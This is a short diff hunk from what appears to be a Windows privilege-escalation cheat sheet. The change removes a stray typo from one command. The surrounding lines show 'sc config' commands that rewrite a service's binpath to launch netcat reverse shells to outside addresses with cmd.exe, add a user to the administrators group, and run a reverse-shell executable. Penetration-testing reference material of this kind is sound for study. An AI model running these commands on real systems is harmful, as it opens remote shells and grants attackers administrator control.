@@ -45,7 +45,7 @@ We can edit the binpath parameter with following commands
 ```powershell
 sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
 sc config <Service_Name> binpath= "net localgroup administrators username /add"
-sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"s
+sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"
 sc config <Service_Name> binpath= "C:\Documents and Settings\PEPE\reverseShell.exe"
 ```
 
